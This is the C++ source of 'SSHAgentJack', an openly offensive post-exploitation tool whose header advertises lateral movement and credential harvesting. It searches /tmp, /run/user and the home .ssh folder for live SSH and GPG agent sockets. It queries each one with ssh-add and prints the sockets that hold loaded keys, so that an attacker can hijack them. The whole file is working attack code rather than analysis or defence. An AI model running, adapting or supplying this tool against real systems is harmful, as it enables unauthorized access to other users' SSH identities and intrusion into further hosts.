/*

SSHAgentJack v1.0

Author: c0d3Ninja
Website: https://gotr00t0day.github.io
Instagram: @gotr00t0day

Description:
Hijacks live SSH agent sockets found on the system. Useful for lateral movement and
credential harvesting during post exploitation without touching disk or cracking anything.

*/

#include <iostream>
#include <filesystem>
#include <vector>
#include <string>
#include <cstdlib>

void banner() {
    std::cout << R"(
  ad8888888888ba
 dP'         `"8b,
 8  ,aaa,       "Y888a     ,aaaa,     ,aaa,  ,aa,
 8  8' `8           "88baadP""""YbaaadP"""YbdP""Yb
 8  8   8              """        """      ""    8b
 8  8, ,8         ,aaaaaaaaaaaaaaaaaaaaaaaaddddd88P
 8  `"""'       ,d8""
 Yb,         ,ad8"    SSHAgentJack v1.0
  "Y8888888888P"

)" << "\n\n";
}

std::string execCommand(const std::string& cmd) {
    std::array<char, 128> buffer;
    std::string result;

    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return "ERROR";

    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result += buffer.data();
    }
    pclose(pipe);
    return result;
}

std::vector<std::string> agentSockets() {
    std::vector<std::string> sockets;

    const char* home = std::getenv("HOME");
    std::vector<std::string> searchDirs = {"/tmp", "/run/user"};
    if (home) searchDirs.push_back(std::string(home) + "/.ssh");

    for (const auto& sDirs : searchDirs) {
        std::error_code ec;
        for (const auto& dir_entry : std::filesystem::recursive_directory_iterator(
                sDirs, std::filesystem::directory_options::skip_permission_denied, ec)) {
            if (!dir_entry.is_socket(ec)) continue;
            std::string fullPath = dir_entry.path().string();
            std::string filename = dir_entry.path().filename().string();
            if (filename.find("agent") != std::string::npos ||
                filename == "openssh_agent" ||
                filename == "S.gpg-agent.ssh")
                sockets.emplace_back(fullPath);
        }
    }
    return sockets;
}

std::vector<std::string> validateSocket(const std::vector<std::string>& socket) {
    std::vector<std::string> valid;
    for (const auto& s : socket) {
        std::string cmd = "SSH_AUTH_SOCK=" + s + " ssh-add -L 2>/dev/null";
        std::string result = execCommand(cmd.c_str());
        if (!result.empty() &&
            result.find("no identities") == std::string::npos &&
            result.find("Error") == std::string::npos)
            valid.push_back(s + "\n  Key: " + result);
    }
    return valid;
}

int main() {
    banner();
    std::vector<std::string> socketResults = agentSockets();
    std::vector<std::string> results = validateSocket(socketResults);
    if (results.empty()) {
        std::cout << "[-] No live agent sockets with keys found.\n";
        return 0;
    }
    std::cout << "[+] Live agent sockets with loaded keys:\n\n";
    for (const auto& entry : results) {
        std::cout << "  Socket: " << entry << "\n";
    }
}
